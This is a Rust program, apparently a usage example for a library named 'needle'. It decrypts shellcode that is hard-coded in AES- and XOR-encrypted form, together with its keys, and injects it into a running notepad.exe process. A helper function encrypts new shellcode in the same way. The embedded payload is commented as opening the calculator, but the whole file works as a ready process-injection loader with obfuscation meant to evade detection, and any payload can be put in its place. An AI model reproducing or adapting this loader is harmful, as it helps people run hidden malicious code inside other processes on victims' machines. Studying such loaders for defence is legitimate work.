use needle::{
    cypher::{AesCypher, AesCypherExt, PayloadCypher, XorCypher, XorCypherExt},
    find_process, inject, Shellcode,
};

const SHELL_CODE: &[u8] = &[
    0xcf, 0x34, 0x1a, 0xdf, 0xc5, 0x09, 0x8f, 0x2f, 0x75, 0xb9, 0xb3, 0x23, 0x89, 0xed, 0xd9, 0x3a,
    0x6c, 0xe6, 0xd2, 0xbe, 0x52, 0x5c, 0x23, 0x76, 0xc0, 0x6f, 0xff, 0x21, 0xb8, 0x22, 0xd1, 0x9c,
    0x36, 0x5e, 0x20, 0x3d, 0x74, 0x2e, 0xf5, 0x56, 0x66, 0x01, 0x23, 0x78, 0xaa, 0x02, 0xe2, 0x85,
    0x2a, 0xee, 0xf7, 0xc2, 0xd6, 0x7d, 0x55, 0xce, 0xb2, 0xbd, 0xbf, 0x86, 0x64, 0x28, 0x4b, 0xd9,
    0x10, 0x95, 0xf5, 0x36, 0x31, 0x1f, 0x9d, 0xc0, 0x42, 0x09, 0x11, 0x83, 0xeb, 0xcd, 0xad, 0xc9,
    0x5a, 0xc4, 0x0d, 0x1a, 0xc2, 0xe0, 0x90, 0xa7, 0xdd, 0x47, 0x61, 0x5d, 0xa5, 0xe2, 0x31, 0xe3,
    0x40, 0x4d, 0xe2, 0x88, 0xe7, 0xd1, 0x88, 0x14, 0x41, 0xe6, 0x0f, 0x07, 0xe5, 0x51, 0xf1, 0x01,
    0x69, 0x55, 0xdb, 0x0c, 0x3f, 0x85, 0xe3, 0x79, 0x44, 0xb7, 0xdc, 0xf8, 0xbe, 0xf4, 0x0b, 0x18,
    0x5d, 0xec, 0xa8, 0xb4, 0xfe, 0x7e, 0x83, 0x24, 0x90, 0x99, 0xa1, 0xd0, 0x21, 0x7e, 0x13, 0xdb,
    0x19, 0x39, 0xde, 0x96, 0xb7, 0x2c, 0x5b, 0xc0, 0x3a, 0x9e, 0xe9, 0xea, 0x3e, 0x76, 0xda, 0x16,
    0x7c, 0x16, 0xd8, 0xeb, 0xf2, 0x6e, 0x4b, 0xe7, 0x62, 0x76, 0x65, 0x0f, 0xfa, 0x93, 0xdf, 0x32,
    0xca, 0x2d, 0x70, 0x15, 0x7f, 0x8c, 0x4b, 0x8c, 0x02, 0x1e, 0x0f, 0x44, 0x24, 0x61, 0xde, 0x49,
    0x47, 0x56, 0xa4, 0x7f, 0x09, 0xf7, 0x58, 0xa9, 0xcb, 0xde, 0x77, 0x9d, 0x47, 0xb1, 0x59, 0xcb,
    0x93, 0x6b, 0x95, 0x38, 0xbf, 0x98, 0xf1, 0x41, 0x00, 0x78, 0x5e, 0x16, 0xef, 0xe5, 0xb4, 0x0d,
    0x83, 0x72, 0xd7, 0xa3, 0x25, 0x19, 0x86, 0x0e, 0x15, 0x34, 0x90, 0x76, 0xdc, 0x5e, 0xc9, 0xf0,
    0x8c, 0x1f, 0x2d, 0x8d, 0xb1, 0xc8, 0xbe, 0xbd, 0xa0, 0xa0, 0x20, 0x94, 0xfa, 0x30, 0xf4, 0x95,
    0xef, 0xd6, 0xe7, 0x4b, 0x01, 0x04, 0x82, 0xf7, 0xb3, 0xec, 0x57, 0xad, 0xce, 0x1c, 0xa8, 0x75,
    0x03, 0x1a, 0x86, 0xfc, 0x17, 0x41, 0x83, 0xf6, 0xab, 0x4f, 0xbf, 0xd8, 0xa9, 0xc7, 0x3c, 0xc5,
    0x23, 0x0b, 0xe9, 0x81, 0x55, 0x04, 0xd6, 0x73, 0x59, 0x68, 0x36, 0x4b, 0xcd, 0x2f, 0x0f, 0x08,
]; // Open calculator

const XOR_KEY: u8 = 0x42;
const AES_KEY: [u8; 32] = [
    0xb2, 0xa3, 0xca, 0x01, 0x0b, 0xda, 0x8b, 0xeb, 0x9f, 0x39, 0xe2, 0x33, 0x79, 0x84, 0x5a, 0x7a,
    0x69, 0xd5, 0x92, 0x53, 0xee, 0xb3, 0xce, 0xd9, 0x10, 0x07, 0x6e, 0xb2, 0x6a, 0x97, 0x4f, 0xff,
];

fn main() {
    let payload = XorCypher::<AesCypher>::from(SHELL_CODE.to_vec())
        .decrypt(&XOR_KEY)
        .decrypt(&AES_KEY);

    let process = find_process("notepad.exe").expect("Target process not found");
    if let Err(e) = inject(process, payload) {
        println!("Could not inject payload: {}", e);
    }
}

#[allow(dead_code)]
fn generate_payload(shellcode: Shellcode) {
    let payload = shellcode
        .into_raw()
        .aes_encrypt(&AES_KEY)
        .xor_encrypt(&XOR_KEY);
    println!("Encrypted shellcode: {:#04x?}", payload);
}
